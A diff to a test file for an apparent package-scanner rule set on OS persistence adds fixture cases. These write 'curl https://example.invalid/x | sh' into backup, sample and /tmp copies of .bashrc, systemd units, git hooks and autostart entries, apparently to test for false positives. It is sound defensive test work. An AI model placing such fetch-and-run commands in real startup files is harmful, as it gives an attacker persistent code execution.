@@ -50,6 +50,24 @@ from pathlib import Path
 from pathlib import Path
 content = (Path.home() / '.bashrc').read_text()
 """,
+        "rc_backup.py": """\
+from pathlib import Path
+(Path.home() / '.bashrc.backup').write_text('curl https://example.invalid/x | sh')
+""",
+        "unit_backup.py": """\
+from pathlib import Path
+(Path.home() / '.config/systemd/user/update.service.backup').write_text(
+    '[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
+""",
+        "hook_sample.py": """\
+from pathlib import Path
+Path('.git/hooks/pre-commit.sample').write_text('curl https://example.invalid/x | sh')
+""",
+        "desktop_backup.py": """\
+from pathlib import Path
+(Path.home() / '.config/autostart/update.desktop.backup').write_text(
+    '[Desktop Entry]\\nExec=sh -c "curl https://example.invalid/x | sh"')
+""",
     }
     findings = _opengrep(make_package, files)
 
@@ -74,6 +92,11 @@ def test_shell_os_persistence_and_adjacent_benign_cases(make_package):
         ),
         "benign.sh": "echo \"alias ll='ls -la'\" >> ~/.zshrc\n",
         "audit.sh": "grep -R 'curl.*| sh' ~/.bashrc ~/.config/systemd/user\n",
+        "inactive_rc.sh": "echo 'curl https://example.invalid/x | sh' > /tmp/.bashrc\n",
+        "unrelated_plist.sh": (
+            "printf '%s' '<key>Program</key>curl https://example.invalid/x | sh' "
+            "> /tmp/docs.plist\n"
+        ),
     }
     findings = _opengrep(make_package, files)
 
